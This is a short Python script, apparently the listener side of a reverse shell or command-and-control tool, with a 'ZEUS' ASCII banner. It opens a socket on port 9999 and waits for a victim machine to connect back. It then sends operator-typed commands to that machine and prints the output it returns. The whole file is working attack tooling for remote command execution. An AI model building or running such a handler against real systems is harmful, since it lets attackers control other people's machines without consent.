
import socket

from colorama import Fore, Back, Style
import time
dog=(Fore.RED+"""


███████╗███████╗██╗   ██╗███████╗
╚══███╔╝██╔════╝██║   ██║██╔════╝
  ███╔╝ █████╗  ██║   ██║███████╗
 ███╔╝  ██╔══╝  ██║   ██║╚════██║
███████╗███████╗╚██████╔╝███████║
╚══════╝╚══════╝ ╚═════╝ ╚══════╝


""")
print(Fore.RED+dog)


sock=socket.socket()
sock.bind(("127.0.0.1",9999))
sock.listen(2)
print("Waiting for connection.....")
conn,addr=sock.accept()


print(Fore.GREEN+"Got connection from {}".format(addr[0]))



def get_output():

    while True:
            output=conn.recv(1024).decode()
            print(output)

            if output[-4::]=="d0ne":
                break



while True:
    inp=input(">> ")
    if inp=="quit":
        sock.close()
        break
    elif inp=="clear":
        print("""\n"""*100)
        print(dog)
        print(Fore.GREEN)
    else:


            conn.send(inp.encode())
            output=get_output()
